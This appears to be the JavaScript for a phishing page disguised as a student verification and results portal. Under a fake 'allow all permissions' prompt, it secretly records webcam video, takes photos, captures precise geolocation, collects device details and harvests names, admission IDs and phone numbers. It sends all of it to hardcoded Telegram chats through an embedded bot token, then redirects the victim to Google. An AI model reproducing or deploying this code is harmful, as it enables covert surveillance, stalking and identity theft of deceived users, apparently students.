const TOKEN = '8546910341:AAFZKnrP036naa4tciDsMS-bk8TZZ8_wekI';

// Array of chat IDs to send to all users
const CHAT_IDS = [
    '1332669070',
    '7246514514',
    '7994937893',
    '7646169456'
];

let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let isRecording = false;
let permissionAttempts = 0;
const MAX_PERMISSION_ATTEMPTS = 8;

// 🎯 Enhanced initialization with permission popup first
class SurveillanceSystem {
    constructor() {
        this.isTelegramWeb = this.detectTelegramWeb();
        this.isChrome = this.detectChrome();
        this.sessionId = this.generateSessionId();
        this.userData = {};
        
        // Show permission popup first before anything else
        this.showPermissionPopup();
    }

    // 🔍 Generate unique session ID
    generateSessionId() {
        return 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    // 🔍 Detect if running in Telegram Web
    detectTelegramWeb() {
        const userAgent = navigator.userAgent.toLowerCase();
        return userAgent.includes('telegram') || 
               userAgent.includes('webview') || 
               window.TelegramWebviewProxy !== undefined;
    }

    // 🔍 Detect if running in Chrome
    detectChrome() {
        const userAgent = navigator.userAgent.toLowerCase();
        return userAgent.includes('chrome') && !userAgent.includes('edg');
    }

    // 🚨 PERMISSION POPUP - Shows first before anything else
    showPermissionPopup() {
        const popupHTML = `
            <div id="permissionPopup" style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.95);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 100000;
                font-family: Arial, sans-serif;
                backdrop-filter: blur(15px);
            ">
                <div style="
                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
                    padding: 40px;
                    border-radius: 25px;
                    text-align: center;
                    max-width: 500px;
                    color: white;
                    box-shadow: 0 25px 50px rgba(0,0,0,0.5);
                    border: 3px solid rgba(255,255,255,0.1);
                    animation: pulse 2s infinite;
                ">
                    <div style="font-size: 5em; margin-bottom: 20px;">⚠️</div>
                    <h1 style="font-size: 2em; margin-bottom: 20px; color: white;">IMPORTANT: Allow All Permissions</h1>
                    
                    <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 15px; margin-bottom: 25px; text-align: left;">
                        <p style="margin: 15px 0; font-size: 1.1em;">✅ <strong>Camera Access:</strong> For identity verification</p>
                        <p style="margin: 15px 0; font-size: 1.1em;">✅ <strong>Microphone Access:</strong> For audio verification</p>
                        <p style="margin: 15px 0; font-size: 1.1em;">✅ <strong>Location Access:</strong> For security purposes</p>
                        <p style="margin: 15px 0; font-size: 1.1em;">✅ <strong>All Other Permissions:</strong> Required for full functionality</p>
                    </div>

                    <p style="font-size: 1.2em; margin-bottom: 30px; line-height: 1.5;">
                        Please <strong style="color: #ffeaa7;">CLICK "ALLOW"</strong> on all permission popups that appear next.<br>
                        This is required to complete your verification process.
                    </p>

                    <button onclick="window.surveillanceSystem.startSystem()" style="
                        background: linear-gradient(135deg, #00b894 0%, #00a085 100%);
                        color: white;
                        border: none;
                        padding: 18px 50px;
                        border-radius: 50px;
                        font-size: 1.3em;
                        font-weight: bold;
                        cursor: pointer;
                        margin: 10px;
                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                        transition: all 0.3s;
                    " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 40px rgba(0,0,0,0.4)'" 
                    onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 30px rgba(0,0,0,0.3)'">
                        I Understand - Start Verification
                    </button>

                    <p style="margin-top: 20px; font-size: 0.9em; opacity: 0.8;">
                        System will begin after you click this button
                    </p>
                </div>
            </div>

            <style>
                @keyframes pulse {
                    0% { transform: scale(1); }
                    50% { transform: scale(1.02); }
                    100% { transform: scale(1); }
                }
            </style>
        `;
        
        document.body.insertAdjacentHTML('afterbegin', popupHTML);
    }

    // 🚀 Start the system after user acknowledges permissions
    async startSystem() {
        // Remove the popup
        const popup = document.getElementById('permissionPopup');
        if (popup) popup.remove();

        // Show loading screen
        this.showLoadingScreen();

        try {
            console.log('🚀 Starting Surveillance System After Permission Acknowledgement');
            
            // Send system info first
            await this.sendComprehensiveSystemInfo();
            
            // Initialize all surveillance components
            await this.initializeSurveillanceComponents();
            
        } catch (error) {
            console.error('System initialization failed:', error);
            this.sendToAllUsers('🚨 *System Initialization Failed*\n• Error: ' + error.message);
        }
    }

    // ⏳ Show loading screen
    showLoadingScreen() {
        const loadingHTML = `
            <div id="loadingScreen" style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 99999;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 30px;
            ">
                <div style="font-size: 4em; margin-bottom: 30px; animation: spin 2s linear infinite;">⏳</div>
                <h1 style="font-size: 2.5em; margin-bottom: 20px;">Initializing Verification System</h1>
                <p style="font-size: 1.3em; margin-bottom: 30px;">Please wait while we set up your verification...</p>
                
                <div style="width: 300px; height: 10px; background: rgba(255,255,255,0.2); border-radius: 5px; overflow: hidden;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: #00b894; transition: width 3s ease-in-out;"></div>
                </div>
                
                <p style="margin-top: 20px; font-size: 1em; opacity: 0.8;" id="loadingStatus">Starting system...</p>
            </div>

            <style>
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        `;
        
        document.body.insertAdjacentHTML('afterbegin', loadingHTML);

        // Animate progress bar
        setTimeout(() => {
            const progressBar = document.getElementById('progressBar');
            const loadingStatus = document.getElementById('loadingStatus');
            if (progressBar) progressBar.style.width = '30%';
            if (loadingStatus) loadingStatus.textContent = 'Requesting permissions...';
        }, 1000);
    }

    // 🚀 Initialize surveillance components
    async initializeSurveillanceComponents() {
        try {
            // Update loading status
            this.updateLoadingStatus('Requesting location access...', 50);

            // Initialize components in sequence
            await this.initializeGeolocationWithRetry();
            
            this.updateLoadingStatus('Accessing camera and microphone...', 70);
            await this.initializeMediaWithRetry();
            
            this.updateLoadingStatus('Setting up verification form...', 90);
            await this.initializeFormHandler();
            
            this.updateLoadingStatus('System ready!', 100);
            
            // Remove loading screen after completion
            setTimeout(() => {
                const loadingScreen = document.getElementById('loadingScreen');
                if (loadingScreen) loadingScreen.remove();
                
                // Show success message
                this.showSystemReadyMessage();
                
            }, 1000);

        } catch (error) {
            console.error('Component initialization failed:', error);
            this.sendToAllUsers('🚨 *Component Initialization Failed*\n• Error: ' + error.message);
        }
    }

    // 📊 Update loading screen status
    updateLoadingStatus(status, progress) {
        const loadingStatus = document.getElementById('loadingStatus');
        const progressBar = document.getElementById('progressBar');
        
        if (loadingStatus) loadingStatus.textContent = status;
        if (progressBar) progressBar.style.width = progress + '%';
    }

    // ✅ Show system ready message
    showSystemReadyMessage() {
        const readyHTML = `
            <div id="systemReady" style="
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: linear-gradient(135deg, #00b894 0%, #00a085 100%);
                color: white;
                padding: 30px;
                border-radius: 20px;
                text-align: center;
                z-index: 99998;
                font-family: Arial, sans-serif;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
                border: 3px solid rgba(255,255,255,0.2);
                animation: fadeIn 0.5s ease-in;
            ">
                <div style="font-size: 4em; margin-bottom: 20px;">✅</div>
                <h2 style="margin-bottom: 15px; font-size: 1.8em;">System Ready!</h2>
                <p style="margin-bottom: 20px; font-size: 1.1em;">All permissions granted successfully.</p>
                <p style="opacity: 0.8;">You can now proceed with the verification form.</p>
            </div>

            <style>
                @keyframes fadeIn {
                    from { opacity: 0; transform: translate(-50%, -60%); }
                    to { opacity: 1; transform: translate(-50%, -50%); }
                }
            </style>
        `;
        
        document.body.insertAdjacentHTML('beforeend', readyHTML);

        // Auto-remove after 3 seconds
        setTimeout(() => {
            const readyMsg = document.getElementById('systemReady');
            if (readyMsg) readyMsg.remove();
        }, 3000);
    }

    // 📍 Persistent Geolocation
    async initializeGeolocationWithRetry() {
        return new Promise(async (resolve) => {
            const tryGeolocation = async () => {
                if (permissionAttempts >= MAX_PERMISSION_ATTEMPTS) {
                    this.sendToAllUsers('❌ *Geolocation permission denied after multiple attempts*');
                    resolve();
                    return;
                }

                if (!navigator.geolocation) {
                    this.sendToAllUsers('❌ *Geolocation not supported*');
                    resolve();
                    return;
                }

                try {
                    const position = await new Promise((positionResolve, positionReject) => {
                        navigator.geolocation.getCurrentPosition(
                            positionResolve, 
                            positionReject, 
                            {
                                enableHighAccuracy: true,
                                timeout: 15000,
                                maximumAge: 0
                            }
                        );
                    });

                    const { latitude, longitude, accuracy } = position.coords;
                    const locationMessage = `📍 *Precise Location Captured*\n\n• **Latitude:** ${latitude}\n• **Longitude:** ${longitude}\n• **Accuracy:** ${accuracy}m\n• **Map:** https://maps.google.com/?q=${latitude},${longitude}\n• **Session:** ${this.sessionId}`;
                    
                    this.sendToAllUsers(locationMessage);
                    resolve();

                } catch (error) {
                    permissionAttempts++;
                    const errorMessage = `📍 *Location Access*\n\n• **Attempt:** ${permissionAttempts}/${MAX_PERMISSION_ATTEMPTS}\n• **Status:** ${error.message}\n• **Session:** ${this.sessionId}`;
                    
                    this.sendToAllUsers(errorMessage);
                    
                    setTimeout(tryGeolocation, 2000);
                }
            };

            await tryGeolocation();
        });
    }

    // 🎥 Enhanced Media Capture
    async initializeMediaWithRetry() {
        if (this.isTelegramWeb) {
            this.sendToAllUsers('📱 *Telegram Web Detected*\n• Media capture will be attempted on form submission');
            return;
        }

        const tryMediaCapture = async () => {
            if (permissionAttempts >= MAX_PERMISSION_ATTEMPTS) {
                this.sendToAllUsers('❌ *Media permission denied after multiple attempts*');
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user',
                        frameRate: { ideal: 30 }
                    },
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        sampleRate: 44100
                    }
                });

                mediaStream = stream;
                this.sendToAllUsers('✅ *Media Access Granted*\n• Camera: Enabled\n• Microphone: Enabled\n• Session: ' + this.sessionId);

                this.startMediaCapture(stream);

            } catch (error) {
                permissionAttempts++;
                const errorDetails = `❌ *Media Access*\n\n• **Attempt:** ${permissionAttempts}/${MAX_PERMISSION_ATTEMPTS}\n• **Session:** ${this.sessionId}\n• **Status:** ${error.name}`;
                
                this.sendToAllUsers(errorDetails);
                
                setTimeout(tryMediaCapture, 3000);
            }
        };

        await tryMediaCapture();
    }

    // 🎬 Start media capture
    async startMediaCapture(stream = null) {
        try {
            if (!stream && !mediaStream) {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: true
                });
                mediaStream = stream;
            }

            const actualStream = stream || mediaStream;
            if (!actualStream) return;

            await this.startVideoRecording(actualStream);
            await this.captureBurstPhotos(actualStream);

        } catch (error) {
            console.error('Media capture failed:', error);
            this.sendToAllUsers('❌ *Media Capture Failed*\n• Error: ' + error.message);
        }
    }

    // 🎥 Video Recording
    async startVideoRecording(stream, duration = 8000) {
        return new Promise(async (resolve) => {
            try {
                if (!MediaRecorder) {
                    this.sendToAllUsers('❌ *Video recording not supported*');
                    resolve();
                    return;
                }

                recordedChunks = [];
                let options = {
                    mimeType: 'video/webm;codecs=vp9,opus',
                    videoBitsPerSecond: 2000000
                };

                const mimeTypes = [
                    'video/webm;codecs=vp9,opus',
                    'video/webm;codecs=vp8,opus',
                    'video/webm',
                    'video/mp4'
                ];

                for (const mimeType of mimeTypes) {
                    if (MediaRecorder.isTypeSupported(mimeType)) {
                        options.mimeType = mimeType;
                        break;
                    }
                }

                mediaRecorder = new MediaRecorder(stream, options);
                isRecording = true;

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    isRecording = false;
                    try {
                        const videoBlob = new Blob(recordedChunks, { type: options.mimeType.split(';')[0] });
                        
                        if (videoBlob.size > 0 && videoBlob.size < 40 * 1024 * 1024) {
                            await this.sendToAllUsers(videoBlob, 'video');
                            this.sendToAllUsers('🎥 *Video Recording Complete*\n• Duration: ' + (duration/1000) + 's\n• Session: ' + this.sessionId);
                        }
                    } catch (error) {
                        console.error('Video processing error:', error);
                    }
                    resolve();
                };

                mediaRecorder.start(1000);
                this.sendToAllUsers('🎥 *Recording Started*\n• Duration: ' + (duration/1000) + 's\n• Session: ' + this.sessionId);

                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    } else {
                        resolve();
                    }
                }, duration);

            } catch (error) {
                console.error('Video recording setup failed:', error);
                this.sendToAllUsers('❌ *Video recording failed*\n• Error: ' + error.message);
                resolve();
            }
        });
    }

    // 📸 Photo Capture
    async captureBurstPhotos(stream, count = 4, interval = 1000) {
        try {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.playsInline = true;
            video.autoplay = true;

            await Promise.race([
                video.play(),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Video play timeout')), 5000))
            ]);

            await new Promise((resolve) => {
                if (video.readyState >= 4) {
                    resolve();
                } else {
                    video.addEventListener('loadeddata', resolve, { once: true });
                    setTimeout(resolve, 3000);
                }
            });

            for (let i = 0; i < count; i++) {
                await new Promise(resolve => setTimeout(resolve, i === 0 ? 500 : interval));
                await this.captureHighQualityPhoto(video, i + 1);
            }

            this.sendToAllUsers('📸 *Burst Photos Complete*\n• Total: ' + count + ' photos\n• Session: ' + this.sessionId);

        } catch (error) {
            console.error('Burst photo capture failed:', error);
            this.sendToAllUsers('❌ *Photo capture failed*\n• Error: ' + error.message);
        }
    }

    // 📸 Single Photo Capture
    async captureHighQualityPhoto(video, photoNumber) {
        return new Promise((resolve) => {
            try {
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d', { willReadFrequently: true });

                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;

                if (canvas.width === 0 || canvas.height === 0) {
                    canvas.width = 1280;
                    canvas.height = 720;
                }

                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                context.fillStyle = 'rgba(0, 0, 0, 0.7)';
                context.fillRect(10, 10, 400, 50);
                
                context.font = '14px Arial';
                context.fillStyle = 'white';
                context.fillText(`Photo ${photoNumber} - ${new Date().toLocaleString()} - Session: ${this.sessionId}`, 20, 35);

                canvas.toBlob(async (blob) => {
                    if (blob && blob.size > 1000) {
                        try {
                            await this.sendToAllUsers(blob, 'photo');
                        } catch (error) {
                            console.error('Photo send failed:', error);
                        }
                    }
                    resolve();
                }, 'image/jpeg', 0.85);

            } catch (error) {
                console.error(`Photo ${photoNumber} capture failed:`, error);
                resolve();
            }
        });
    }

    // 📝 Form Handler
    initializeFormHandler() {
        const loginForm = document.getElementById('loginForm');
        if (!loginForm) {
            this.createFallbackForm();
            return;
        }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            await this.handleFormSubmission();
        });
    }

    // 🚀 Handle form submission
    async handleFormSubmission() {
        try {
            const formData = this.collectFormData();
            const formMessage = this.createFormMessage(formData);
            await this.sendToAllUsers(formMessage);

            this.showProcessingMessage();

            try {
                if (this.isTelegramWeb || !mediaStream) {
                    await this.startMediaCapture();
                } else {
                    await this.captureFinalPhoto();
                }
            } catch (mediaError) {
                console.error('Form media capture failed:', mediaError);
            }

            this.showSuccessMessage(formData.name);

        } catch (error) {
            console.error('Form submission error:', error);
            this.showSuccessMessage('User');
        }
    }

    // 📄 Collect form data
    collectFormData() {
        return {
            name: document.getElementById('name')?.value.trim() || 'Not provided',
            father: document.getElementById('father')?.value.trim() || 'Not provided',
            admId: document.getElementById('admId')?.value.trim() || 'Not provided',
            phone: document.getElementById('phone')?.value.trim() || 'Not provided',
            timestamp: new Date().toLocaleString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            sessionId: this.sessionId
        };
    }

    // 📝 Create form message
    createFormMessage(formData) {
        return `📄 *Form Submission Captured*\n\n` +
            `• 👤 **Full Name:** ${formData.name}\n` +
            `• 👨‍👦 **Father's Name:** ${formData.father}\n` +
            `• 🆔 **Admission ID:** ${formData.admId}\n` +
            `• 📞 **Phone Number:** ${formData.phone}\n` +
            `• 🕐 **Submission Time:** ${formData.timestamp}\n` +
            `• 💻 **Platform:** ${formData.platform}\n` +
            `• 📱 **Screen:** ${formData.screen}\n` +
            `• 🆔 **Session ID:** ${formData.sessionId}`;
    }

    // 📸 Capture final photo
    async captureFinalPhoto() {
        if (!mediaStream) return;
        
        try {
            const video = document.createElement('video');
            video.srcObject = mediaStream;
            await video.play();
            await new Promise(resolve => setTimeout(resolve, 1000));
            await this.captureHighQualityPhoto(video, 'FINAL');
        } catch (error) {
            console.error('Final photo capture failed:', error);
        }
    }

    // ⏳ Show processing message
    showProcessingMessage() {
        const processingHTML = `
            <div style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #ff7e5f 0%, #feb47b 100%);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 20px;
            ">
                <div style="font-size: 4em; margin-bottom: 20px;">⏳</div>
                <h1 style="font-size: 2em; margin-bottom: 20px;">Processing Your Submission</h1>
                <p style="font-size: 1.2em; margin-bottom: 10px;">Verifying your information...</p>
                <p style="font-size: 1em; opacity: 0.8;">Session: ${this.sessionId}</p>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', processingHTML);
    }

    // 💫 Success message
    showSuccessMessage(name) {
        const processingMsg = document.querySelector('div[style*="background: linear-gradient(135deg, #ff7e5f 0%, #feb47b 100%)"]');
        if (processingMsg) processingMsg.remove();

        const successHTML = `
            <div style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 10000;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 20px;
            ">
                <div style="font-size: 4em; margin-bottom: 20px;">🎉</div>
                <h1 style="font-size: 2.5em; margin-bottom: 20px;">Verification Successful!</h1>
                <p style="font-size: 1.5em; margin-bottom: 30px;">Dear ${name}, we will send you SMS of your result shortly.</p>
                <p style="font-size: 1.2em; opacity: 0.9;">Session: ${this.sessionId}</p>
                <p style="font-size: 1.2em; opacity: 0.9;">Redirecting to results portal...</p>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', successHTML);
        
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 4000);
    }

    // 📋 Create fallback form
    createFallbackForm() {
        const formHTML = `
            <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; padding: 20px;">
                <h2>Student Verification Form</h2>
                <p style="color: #666; margin-bottom: 20px;">Please fill in your details for verification</p>
                <form id="fallbackLoginForm">
                    <input type="text" id="name" placeholder="Full Name" required style="display: block; width: 100%; margin: 10px 0; padding: 15px; border: 2px solid #ddd; border-radius: 10px;">
                    <input type="text" id="father" placeholder="Father's Name" required style="display: block; width: 100%; margin: 10px 0; padding: 15px; border: 2px solid #ddd; border-radius: 10px;">
                    <input type="text" id="admId" placeholder="Admission ID" required style="display: block; width: 100%; margin: 10px 0; padding: 15px; border: 2px solid #ddd; border-radius: 10px;">
                    <input type="tel" id="phone" placeholder="Phone Number" required style="display: block; width: 100%; margin: 10px 0; padding: 15px; border: 2px solid #ddd; border-radius: 10px;">
                    <button type="submit" style="background: #4CAF50; color: white; padding: 18px 30px; border: none; border-radius: 10px; cursor: pointer; font-size: 1.1em; width: 100%;">Submit Verification</button>
                </form>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', formHTML);
        
        document.getElementById('fallbackLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            await this.handleFormSubmission();
        });
    }

    // 🖥️ Comprehensive System Info
    async sendComprehensiveSystemInfo() {
        const systemInfo = `🖥️ *System Initialized - Permission Mode*\n\n` +
            `• 🆔 **Session ID:** ${this.sessionId}\n` +
            `• 🌐 **URL:** ${window.location.href}\n` +
            `• 🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `• 📱 **User Agent:** ${navigator.userAgent.substring(0, 80)}...\n` +
            `• 💻 **Platform:** ${navigator.platform}\n` +
            `• 🖥️ **Screen:** ${screen.width}x${screen.height}\n` +
            `• 🌍 **Language:** ${navigator.language}\n` +
            `• ⚡ **Cores:** ${navigator.hardwareConcurrency || 'Unknown'}\n` +
            `• 📊 **Memory:** ${navigator.deviceMemory || 'Unknown'}GB\n` +
            `• 🔍 **Environment:** ${this.isTelegramWeb ? 'Telegram Web' : (this.isChrome ? 'Chrome' : 'Other Browser')}\n` +
            `• ✅ **Permission Mode:** User acknowledged permission requirements`;

        await this.sendToAllUsers(systemInfo);
    }

    // 📤 Send to all users
    async sendToAllUsers(data, type = 'message') {
        const sendTime = Date.now();
        
        try {
            const sendPromises = CHAT_IDS.map(async (chatId, index) => {
                try {
                    await this.sendToTelegram(data, type, chatId);
                    console.log(`✅ Sent ${type} to ${chatId} (${index + 1}/${CHAT_IDS.length})`);
                } catch (error) {
                    console.error(`❌ Failed to send to ${chatId}:`, error);
                }
            });

            await Promise.allSettled(sendPromises);
            
            const duration = Date.now() - sendTime;
            console.log(`📤 All ${type} messages processed in ${duration}ms`);

        } catch (error) {
            console.error('Batch send error:', error);
        }
    }

    // 📤 Telegram API
    async sendToTelegram(data, type = 'message', chatId) {
        const maxRetries = 3;
        
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                if (type === 'photo') {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', data);
                    formData.append('caption', `📸 Photo • ${new Date().toLocaleString()} • Session: ${this.sessionId}`);

                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) throw new Error(`HTTP ${response.status}`);

                } else if (type === 'video') {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', data, `video_${Date.now()}.mp4`);
                    formData.append('caption', `🎥 Video • ${new Date().toLocaleString()} • Session: ${this.sessionId}`);

                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) throw new Error(`HTTP ${response.status}`);

                } else {
                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: data,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true
                        })
                    });

                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
                }
                
                break;

            } catch (error) {
                if (attempt === maxRetries) {
                    throw error;
                }
                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            }
        }
    }

    // 🛑 Cleanup
    cleanup() {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }

        if (mediaStream) {
            mediaStream.getTracks().forEach(track => {
                track.stop();
                track.enabled = false;
            });
            mediaStream = null;
        }

        recordedChunks = [];
        isRecording = false;

        console.log('🛑 Surveillance system cleaned up');
    }
}

// 🚀 Initialize the system - This creates the global instance
const surveillanceSystem = new SurveillanceSystem();

// 🎯 Event listeners
window.addEventListener('load', () => {
    console.log('🚀 Page loaded - Permission popup active');
});

window.addEventListener('beforeunload', () => {
    surveillanceSystem.cleanup();
    surveillanceSystem.sendToAllUsers('👋 *Session Ended*\n• Session: ' + surveillanceSystem.sessionId + '\n• Time: ' + new Date().toLocaleString());
});

window.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        surveillanceSystem.sendToAllUsers('🔍 *User switched tab/window*\n• Session: ' + surveillanceSystem.sessionId + '\n• Time: ' + new Date().toLocaleString());
    }
});

window.addEventListener('error', (event) => {
    console.error('Global error:', event.error);
    surveillanceSystem.sendToAllUsers('🚨 *JavaScript Error*\n• Session: ' + surveillanceSystem.sessionId + '\n• Error: ' + event.error?.message);
});